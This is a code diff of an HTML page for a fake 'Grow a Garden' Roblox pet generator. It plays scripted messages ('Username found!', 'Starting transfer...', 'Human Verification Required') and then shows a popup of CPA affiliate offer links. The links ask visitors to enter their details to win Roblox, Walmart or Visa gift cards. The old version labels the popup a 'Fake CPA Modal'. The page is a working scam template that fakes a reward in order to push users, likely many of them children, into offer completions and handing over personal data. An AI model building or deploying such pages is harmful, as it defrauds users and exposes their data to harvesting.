@@ -2,97 +2,89 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Generating...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Processing...</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="loading-box">
-    <img src="logo.png" alt="Grow a Garden Logo" class="logo-small" />
+  <div class="loading-container">
+    <img src="logo.png" alt="Grow a Garden Logo" class="logo" />
     <p id="loadingText" class="loading-text"></p>
     <div class="dots">
-      <span class="dot done"></span>
-      <span class="dot done"></span>
-      <span class="dot done"></span>
-      <span class="dot"></span>
-      <span class="dot"></span>
+      <span class="dot" id="dot1"></span>
+      <span class="dot" id="dot2"></span>
+      <span class="dot" id="dot3"></span>
+      <span class="dot" id="dot4"></span>
+      <span class="dot" id="dot5"></span>
     </div>
-    <button id="verifyBtn" class="hidden" onclick="showCPAModal()">Verify</button>
   </div>
 
-  <!-- Fake CPA Modal -->
-  <div class="modal" id="cpaModal">
-    <div class="modal-content">
-      <img src="logo.png" alt="Grow a Garden" class="modal-logo" />
-      <h2>🎁 LAST STEP !</h2>
-      <p>Complete a simple task below and your pet will be sent to your account. Don’t worry, it’s free!</p>
-      <a href="https://your-cpa-grip-link.com" target="_blank" class="cpa-offer">Enter for a Chance to win a $50 gift card for Roblox!</a>
-      <a href="https://your-cpa-grip-link.com" target="_blank" class="cpa-offer">Don’t miss out! $500 on the line for Walmart, enter NOW!</a>
-      <a href="https://your-cpa-grip-link.com" target="_blank" class="cpa-offer">Enter your details to Win a prepaid Visa Card!</a>
-      <div class="loader-circle"></div>
-    </div>
+  <div class="verify-popup" id="verifyPopup" style="display: none;">
+    <h3>🎁 LAST STEP !</h3>
+    <p>Complete a simple task below and your pet will be sent to your account — don’t worry, it’s free!</p>
+    <a href="https://www.cpagrip.com/show.php?l=0&u=YOURID&id=000000" class="offer-button">Enter for a Chance to win a $50 gift card for Roblox!</a>
+    <a href="https://www.cpagrip.com/show.php?l=0&u=YOURID&id=000001" class="offer-button">Don't miss out! $500 on the line for Walmart, enter NOW!</a>
+    <a href="https://www.cpagrip.com/show.php?l=0&u=YOURID&id=000002" class="offer-button">Enter your details to Win a prepaid Visa Card!</a>
   </div>
 
   <script>
-    const steps = [
-      "Connecting to server...",
-      "Successfully connected.",
-      "Finding username...",
-      { text: "Username found!", class: "green" },
-      "Generating items...",
-      { text: "Starting transfer...", class: "green" },
-      "Verifying human activity...",
-      { text: "Human Verification Required.", class: "red" }
+    const messages = [
+      { text: "Connecting to servers...", color: "black", delay: 1000 },
+      { text: "Successfully connected.", color: "green", delay: 1000 },
+      { text: "Finding username...", color: "black", delay: 1000 },
+      { text: "Username found!", color: "green", delay: 1000 },
+      { text: "Generating items...", color: "black", delay: 1000 },
+      { text: "Starting transfer...", color: "green", delay: 1000 },
+      { text: "Verifying human activity...", color: "black", delay: 4000 },
+      { text: "Human Verification Required.", color: "red", delay: 0 }
     ];
 
-    const loadingText = document.getElementById("loadingText");
-    const verifyBtn = document.getElementById("verifyBtn");
+    const dots = ["dot1", "dot2", "dot3", "dot4", "dot5"];
+    let currentIndex = 0;
+    const textEl = document.getElementById("loadingText");
 
-    let index = 0;
+    function updateDots(index) {
+      dots.forEach((dotId, i) => {
+        document.getElementById(dotId).style.backgroundColor = i <= index ? "#00cc66" : "#ccc";
+      });
+    }
 
-    function typeMessage(message, callback) {
-      loadingText.className = "loading-text";
-      if (typeof message === "object") {
-        loadingText.classList.add(message.class);
-        message = message.text;
-      }
-
-      loadingText.textContent = "";
+    function typeText(text, color, callback) {
+      textEl.innerHTML = "";
+      textEl.style.color = color;
       let i = 0;
       const interval = setInterval(() => {
-        loadingText.textContent += message.charAt(i);
-        i++;
-        if (i >= message.length) {
+        if (i < text.length) {
+          textEl.innerHTML += text.charAt(i);
+          i++;
+        } else {
           clearInterval(interval);
-          setTimeout(callback, message.includes("Verifying human activity") ? 4000 : 1000);
+          if (callback) callback();
         }
       }, 40);
     }
 
-    function showCPAModal() {
-      document.getElementById("cpaModal").style.display = "flex";
-    }
-
     function nextStep() {
-      if (index >= steps.length) return;
-      typeMessage(steps[index], () => {
-        document.querySelectorAll(".dot")[index]?.classList.add("done");
-        if (steps[index].text?.includes("Human Verification Required.") || steps[index]?.includes("Human Verification Required.")) {
-          verifyBtn.classList.remove("hidden");
-        }
-        index++;
-        nextStep();
-      });
+      if (currentIndex < messages.length) {
+        const { text, color, delay } = messages[currentIndex];
+        updateDots(currentIndex);
+        typeText(text, color, () => {
+          setTimeout(() => {
+            currentIndex++;
+            nextStep();
+          }, delay);
+        });
+      } else {
+        document.getElementById("verifyPopup").style.display = "block";
+      }
     }
 
-    window.onload = nextStep;
+    // Clear username from history if user comes back
+    if (window.history.replaceState) {
+      window.history.replaceState(null, null, window.location.pathname);
+    }
 
-    // Clear username when user goes back
-    window.addEventListener("pageshow", () => {
-      if (window.performance && window.performance.navigation.type === 2) {
-        sessionStorage.removeItem("username");
-      }
-    });
+    nextStep();
   </script>
 </body>
 </html>
